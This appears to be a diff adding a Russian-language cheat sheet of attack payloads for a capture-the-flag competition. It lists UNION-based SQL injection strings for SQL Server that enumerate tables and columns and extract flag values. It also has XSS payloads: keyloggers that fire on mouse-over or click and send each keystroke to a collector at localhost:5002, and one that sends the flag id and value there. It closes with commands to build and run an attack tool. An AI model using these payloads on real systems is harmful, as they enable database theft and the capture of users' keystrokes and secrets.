@@ -1,0 +1,44 @@
+﻿SQL-injection
+=============
+
+Определяем, что это SQL Server 2012:
+##!#' union all select @@version union all select '
+
+Получаем названия таблиц:
+##!#' union all (select [table_name] from (select [table_name], row_number() over (order by [table_name]) as rnum from information_schema.tables where table_type='BASE TABLE') as t where rnum = 1) union all select '
+
+Получаем названия столбцов таблиц:
+##!#' union all (select [column_name] from (select [column_name], row_number() over (order by [column_name]) as rnum from information_schema.COLUMNS where TABLE_NAME = N'flag') as t where rnum = 1) union all select '
+
+Получаем ключи флагов:
+##!#' union all (select [key] from (select [key], row_number() over (order by [value]) as rnum from [flag]) as t where rnum = 1) union all select '
+
+Получаем значения флагов:
+##!#' union all (select [value] from (select [value], row_number() over (order by [value]) as rnum from [flag]) as t where rnum = 1) union all select '
+
+Получаем последний добавленный флаг: "<id> <flag>":
+##!#' union all (select [key] + ' ' + [value] from (select [key], [value], row_number() over (order by [id] desc) as rnum from [flag]) as t where rnum = 1) union all select '
+
+
+XSS
+===
+
+С помощью наведения мышкой воруем пользовательский ввод:
+
+<div onmouseenter=eval('d=0;if(!d){d=1;document.body.onkeydown=function(e){fetch(`http:\/\/localhost:5002\/?k=${e.key}`)}}');>Не наводи на меня мышку, а то хуже будет</div>
+
+То же самое, с помощью клика по кнопке:
+
+<button onclick=eval('d=0;if(!d){d=1;document.body.onkeydown=function(e){fetch(`http:\/\/localhost:5002\/?k=${e.key}`)}}');>Не кликай на меня! а то пожалеешь</button>
+
+Отправляем id и flag после клика по кнопке:
+
+<button onclick=eval('d=0;if(!d){d=1;f=document;euc=encodeURIComponent;qs=f.querySelector.bind(f);qs(`#btn-get-flag`).addEventListener(`click`,function(){setTimeout(function(){fetch(`http:\/\/localhost:5002\/?k=${euc(qs(`#key`).value)}^${euc(qs(`#flag_value`).textContent)}`)},100)})}');>Не кликай на меня! а то пожалеешь</button>
+
+
+
+cd attack
+go build
+.\attack.exe
+
+
